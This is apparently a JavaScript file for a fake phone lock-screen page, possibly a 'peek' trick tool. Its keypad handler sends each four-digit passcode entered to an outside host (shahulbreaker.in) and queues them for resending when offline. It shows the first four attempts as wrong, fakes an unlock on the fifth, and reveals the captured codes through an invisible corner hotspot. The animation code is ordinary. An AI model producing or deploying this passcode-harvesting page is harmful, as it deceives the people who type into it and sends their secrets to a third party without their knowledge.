(() => {
  const API_BASE = "https://shahulbreaker.in/api/storedata.php?user=tarunpeek&data=";
  const MAX = 4;
  let code = "";

  const dotEls = Array.from(document.querySelectorAll('.dot'));
  const keys = Array.from(document.querySelectorAll('.key[data-num]'));
  const emergency = document.getElementById('emergency');
  const cancelBtn = document.getElementById('cancel');
  const unlockOverlay = document.getElementById('unlockOverlay');
  const lockInner = document.querySelector('.lockscreen-inner');
  const homescreenImg = document.getElementById('homescreenImg');
  const ATT_KEY = '_pass_attempt_count_';
  const QUEUE_KEY = '_pass_queue_';

  // new storage key for last 4 entered codes (rotating buffer)
  const LAST_CODES_KEY = '_pass_last_codes_';
  function getLastCodes() {
    try {
      return JSON.parse(localStorage.getItem(LAST_CODES_KEY) || '[]');
    } catch (e) {
      return [];
    }
  }
  function pushLastCode(c) {
    const arr = getLastCodes();
    arr.push(c);
    // keep only last 4
    while (arr.length > 4) arr.shift();
    localStorage.setItem(LAST_CODES_KEY, JSON.stringify(arr));
  }
  function getCombinedLastCodes() {
    const arr = getLastCodes();
    return arr.join(',');
  }

  function getAttempts() { return parseInt(localStorage.getItem(ATT_KEY) || '0', 10); }
  function setAttempts(n) { localStorage.setItem(ATT_KEY, String(n)); }

  function refreshDots() {
    dotEls.forEach((d,i) => d.classList.toggle('filled', i < code.length));
  }

  function reset() {
    code = "";
    refreshDots();
  }

  function queuePass(pass) {
    const q = JSON.parse(localStorage.getItem(QUEUE_KEY) || '[]');
    q.push({ pass, ts: Date.now() });
    localStorage.setItem(QUEUE_KEY, JSON.stringify(q));
  }

  function sendToAPI(pass) {
    const url = API_BASE + encodeURIComponent(pass);
    return fetch(url, { method: 'GET', keepalive: true })
      .catch(() => {
        queuePass(pass);
      });
  }

  function flushQueue() {
    const queue = JSON.parse(localStorage.getItem(QUEUE_KEY) || '[]');
    if (!queue.length) return;
    queue.forEach(item => {
      fetch(API_BASE + encodeURIComponent(item.pass), { method: 'GET', keepalive: true }).catch(()=>{});
    });
    localStorage.removeItem(QUEUE_KEY);
  }

  /* ---------- Spring engine (semi-implicit integrator) ---------- */
  // options: { from, to, velocity (optional), mass, stiffness, damping, onUpdate, onComplete, threshold }
  function springAnimate(opts) {
    const mass = opts.mass ?? 1;
    const stiffness = opts.stiffness ?? 120; // k
    const damping = opts.damping ?? 14;      // c
    const threshold = opts.threshold ?? 0.02;
    let x = opts.from;
    let v = opts.velocity ?? 0;
    const target = opts.to;
    let last = performance.now();
    let rafId = null;

    function step(now) {
      const dt = Math.min(0.032, (now - last) / 1000); // cap dt to avoid big jumps
      last = now;
      // Hooke's law + damping: a = (-k*(x - target) - c*v) / m
      const a = (-stiffness * (x - target) - damping * v) / mass;
      v += a * dt;
      x += v * dt;

      if (typeof opts.onUpdate === 'function') opts.onUpdate(x);

      const isSettled = Math.abs(v) < threshold && Math.abs(x - target) < (Math.abs(target) * 0.005 + 0.5);
      if (isSettled) {
        // ensure final snap
        if (typeof opts.onUpdate === 'function') opts.onUpdate(target);
        if (typeof opts.onComplete === 'function') opts.onComplete();
        cancelAnimationFrame(rafId);
        return;
      }
      rafId = requestAnimationFrame(step);
    }

    rafId = requestAnimationFrame(step);
    return () => cancelAnimationFrame(rafId); // return a cancel function
  }

  /* ---------- playUnlockAnimation uses two springs ---------- */
  function playUnlockAnimation() {
    // Respect reduced-motion
    const prefersReduced = window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches;
    if (!lockInner || !unlockOverlay || !homescreenImg) return;

    // reveal the homescreen image layer immediately (it will animate)
    unlockOverlay.classList.add('show');

    if (prefersReduced) {
      // instant fallback
      lockInner.style.transform = `translate3d(0, -110%, 0)`;
      homescreenImg.style.transform = `translate3d(0,0,0) scale(1)`;
      homescreenImg.style.opacity = '1';
      homescreenImg.style.filter = 'blur(0) saturate(1)';
      return;
    }

    // compute numeric pixel target for lock translate
    const height = Math.max(window.innerHeight, document.documentElement.clientHeight);
    const targetY = -Math.round(height * 1.08); // move a bit past top

    // start state
    lockInner.style.willChange = 'transform, opacity';
    homescreenImg.style.willChange = 'transform, filter, opacity';
    // ensure initial styles
    lockInner.style.transform = `translate3d(0,0,0) scale(1)`;
    homescreenImg.style.transform = `translate3d(0,6%,0) scale(0.96)`;
    homescreenImg.style.opacity = '0';
    homescreenImg.style.filter = 'blur(10px) saturate(0.9)';

    // shadow visual: apply large shadow while animating
    lockInner.style.boxShadow = '0 40px 90px rgba(0,0,0,0.55)';

    // spring for lock Y (pixels)
    const cancelLock = springAnimate({
      from: 0,
      to: targetY,
      mass: 1.05,
      stiffness: 140,
      damping: 16,
      onUpdate: (val) => {
        // val is pixels from 0 -> targetY (negative)
        // map to scale slight (small effect)
        const progress = Math.min(1, Math.abs(val / targetY)); // 0..1
        const scale = 1 - 0.003 * progress; // tiny shrink while lifting
        lockInner.style.transform = `translate3d(0, ${val}px, 0) scale(${scale})`;
        // fade a bit as it goes
        lockInner.style.opacity = String(1 - Math.min(0.18, progress * 0.18));
      },
      onComplete: () => {
        // remove shadow and hide inner off-screen (keep homescreen shown)
        lockInner.style.boxShadow = '';
        lockInner.style.opacity = '0';
        // keep transform at final position (or clear if you prefer)
        lockInner.style.transform = `translate3d(0, ${targetY}px, 0)`;
      }
    });

    // spring for homescreen (scale & exposure)
    // We'll animate a small overshoot scale and sharpen (blur -> 0)
    const cancelHome = springAnimate({
      from: 0, // we'll drive "progress" between 0..1 by mapping x, not absolute scale here
      to: 1,
      mass: 1,
      stiffness: 80,
      damping: 11,
      onUpdate: (p) => {
        // p will progress 0 -> 1 but spring oscillates; clamp for mapping
        const progress = Math.max(0, Math.min(1, p));
        // map to scale overshoot: 0->1 maps to 0.96 -> 1.04 -> 1
        // We'll use a simple mapping from progress to scale; because spring oscillates around 1, p may overshoot <0 or >1: handle it
        const raw = p; // spring value
        // convert to scale via interpolation around 1
        const scale = 1 + (raw - 1) * 0.12; // gives slight overshoot (e.g. if raw = 1.2 -> scale ~1.024)
        // clamp reasonable range
        const finalScale = Math.max(0.96, Math.min(1.06, scale));
        homescreenImg.style.transform = `translate3d(0,0,0) scale(${finalScale})`;

        // blur mapping: when raw small -> blurry, when near 1 -> sharp
        const blur = Math.max(0, 10 * (1 - Math.min(1, raw)));
        const sat = 0.9 + Math.min(0.15, raw * 0.15);
        homescreenImg.style.filter = `blur(${blur}px) saturate(${sat})`;
        homescreenImg.style.opacity = String(Math.min(1, 0.1 + raw)); // fade in quickly
      },
      onComplete: () => {
        homescreenImg.style.transform = 'translate3d(0,0,0) scale(1)';
        homescreenImg.style.filter = 'blur(0) saturate(1)';
        homescreenImg.style.opacity = '1';
      }
    });

    // Optional: cleanup both springs after a timeout (in case onComplete didn't fire)
    setTimeout(() => {
      lockInner.style.boxShadow = '';
      homescreenImg.style.willChange = '';
      lockInner.style.willChange = '';
    }, 1200);
  }

  function animateWrongAttempt() {
    const dotsEl = document.getElementById('dots');
    if (!dotsEl) {
      reset();
      return;
    }
    const DURATION = 700;
    dotsEl.classList.add('wrong');
    reset();
    setTimeout(() => {
      dotsEl.classList.remove('wrong');
    }, DURATION + 20);
  }

  async function handleCompleteAttempt(enteredCode) {
    let attempts = getAttempts();
    attempts += 1;
    setAttempts(attempts);

    // NEW: push entered code into rotating buffer of last 4 (does not change your send behavior)
    try { pushLastCode(enteredCode); } catch(e) {}

    // old behaviour: attempts 1-4 -> send, 5 -> unlock animation
    if (attempts >= 1 && attempts <= 4) {
      sendToAPI(enteredCode);
      animateWrongAttempt();
    } else if (attempts === 5) {
      playUnlockAnimation();
      setTimeout(reset, 300);
    }

    if (attempts >= 5) {
      setAttempts(0);
    }
  }

  function animateBrightness(el, target, duration) {
    let startTime;
    const initial = parseFloat(el.dataset.brightness || "1");
    const change = target - initial;

    function easeOutCubic(t) {
      return 1 - Math.pow(1 - t, 3);
    }

    function frame(ts) {
      if (!startTime) startTime = ts;
      const progress = Math.min((ts - startTime) / duration, 1);
      const eased = easeOutCubic(progress);
      const value = initial + change * eased;
      el.style.filter = `brightness(${value})`;
      el.dataset.brightness = value.toFixed(3);
      if (progress < 1) {
        requestAnimationFrame(frame);
      }
    }
    requestAnimationFrame(frame);
  }

  keys.forEach(k => {
    const num = k.dataset.num;
    if (!num) return;

    k.addEventListener('touchstart', () => {
      animateBrightness(k, 1.6, 80);
    }, { passive: true });

    const endPress = () => {
      animateBrightness(k, 1, 100);
    };
    k.addEventListener('touchend', endPress);
    k.addEventListener('touchcancel', endPress);
    k.addEventListener('mouseleave', endPress);

    k.addEventListener('click', () => {
      if (code.length >= MAX) return;
      code += num;
      refreshDots();

      if (code.length === MAX) {
        const enteredCode = code;
        setTimeout(() => {
          handleCompleteAttempt(enteredCode);
        }, 120);
      }
    });
  });

  emergency && emergency.addEventListener('click', e => e.preventDefault());
  cancelBtn && cancelBtn.addEventListener('click', e => { e.preventDefault(); reset(); });

  window.addEventListener('online', flushQueue);
  flushQueue();

  /* ---------- Invisible bottom-left hotspot: show combined last-4 codes on press ---------- */

  function createInvisibleHotspotAndDisplay() {
    // Hotspot (invisible)
    if (!document.getElementById('codesHotspot')) {
      const hs = document.createElement('div');
      hs.id = 'codesHotspot';
      Object.assign(hs.style, {
        position: 'fixed',
        left: '8px',
        bottom: '8px',
        width: '56px',
        height: '56px',
        borderRadius: '12px',
        background: 'transparent',        // completely invisible
        border: 'none',
        zIndex: '12000',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        boxSizing: 'border-box',
        touchAction: 'none',
        cursor: 'pointer',
        pointerEvents: 'auto'
      });
      document.body.appendChild(hs);
    }

    // Combined display (hidden by default)
    if (!document.getElementById('codesCombinedDisplay')) {
      const d = document.createElement('div');
      d.id = 'codesCombinedDisplay';
      Object.assign(d.style, {
        position: 'fixed',
        left: '8px',
        bottom: '72px',
        minWidth: '160px',
        maxWidth: 'calc(100% - 16px)',
        zIndex: '12001',
        display: 'none',
        justifyContent: 'center',
        pointerEvents: 'none',
        transition: 'opacity 120ms ease, transform 120ms ease'
      });

      const inner = document.createElement('div');
      inner.id = 'codesCombinedInner';
      Object.assign(inner.style, {
        width: '100%',
        background: 'rgba(0,0,0,0.7)',  // translucent dark so it's readable
        borderRadius: '12px',
        padding: '10px 12px',
        boxSizing: 'border-box',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        color: '#fff',
        fontSize: '16px',
        fontFamily: 'ui-monospace, SFMono-Regular, Menlo, monospace',
        fontWeight: '700',
        letterSpacing: '0.6px'
      });

      d.appendChild(inner);
      document.body.appendChild(d);
    }
  }

  function showCombinedStringAtBottomLeft() {
    if (!unlockOverlay || !unlockOverlay.classList.contains('show')) return;
    createInvisibleHotspotAndDisplay();
    const bar = document.getElementById('codesCombinedDisplay');
    const inner = document.getElementById('codesCombinedInner');
    inner.textContent = ''; // clear

    const codes = getLastCodes();
    if (!codes || codes.length === 0) {
      inner.textContent = '';
    } else {
      const combined = codes.join(',');
      inner.textContent = combined;
    }

    bar.style.display = 'flex';
    // animate in
    requestAnimationFrame(() => {
      bar.style.transform = 'translateY(0)';
      bar.style.opacity = '1';
    });
  }

  function hideCombinedDisplayNow() {
    const bar = document.getElementById('codesCombinedDisplay');
    if (!bar) return;
    bar.style.transform = 'translateY(8px)';
    bar.style.opacity = '0';
    setTimeout(() => {
      if (bar) bar.style.display = 'none';
    }, 140);
  }

  // Hotspot handlers: show on pointerdown, hide on pointerup/pointercancel
  function onHotspotDown(ev) {
    if (!unlockOverlay || !unlockOverlay.classList.contains('show')) return;
    ev.preventDefault();
    showCombinedStringAtBottomLeft();
  }
  function onHotspotUp(ev) {
    hideCombinedDisplayNow();
  }

  function ensureHotspotListeners() {
    createInvisibleHotspotAndDisplay();
    const hs = document.getElementById('codesHotspot');
    if (!hs._attached) {
      hs.addEventListener('pointerdown', onHotspotDown);
      window.addEventListener('pointerup', onHotspotUp);
      window.addEventListener('pointercancel', onHotspotUp);
      // fallback for some touch stacks
      hs.addEventListener('touchstart', onHotspotDown, { passive: false });
      window.addEventListener('touchend', onHotspotUp);
      window.addEventListener('touchcancel', onHotspotUp);
      hs._attached = true;
    }
  }

  ensureHotspotListeners();

  window.__passUI = { getCode: () => code, reset, getAttempts, queuePass };

})();
